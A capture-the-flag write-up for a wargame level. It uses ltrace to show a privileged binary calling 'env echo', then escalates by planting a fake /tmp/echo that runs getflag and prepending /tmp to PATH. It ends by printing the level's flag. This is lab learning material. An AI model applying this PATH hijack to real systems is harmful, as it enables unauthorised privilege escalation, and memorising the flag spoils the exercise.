1. We are given `level03` executable. Attempt to launch it results to oupupt: "Exploit me". Seems like this binary has some vulnerability inside
2. Check system calls during execution
```
$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff6e4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                = 2003
geteuid()                                                = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)      = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)      = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                   = 0
+++ exited (status 0) +++
```
3. Here it's possible to exploit `echo` command, replacing it with our fake `echo`
4. Create file `/tmp/echo` that will contain `getflag`, give full rights
``` Bash
echo getflag > /tmp/echo
chmod 777 /tmp/echo
```
5. Add to environmental variable PATH our path to fake `echo`
``` Bash
export PATH=/tmp:$PATH
```
6. Execution of binary results flag output for level04: **qi0maab88jeaj46qoumi7maus**
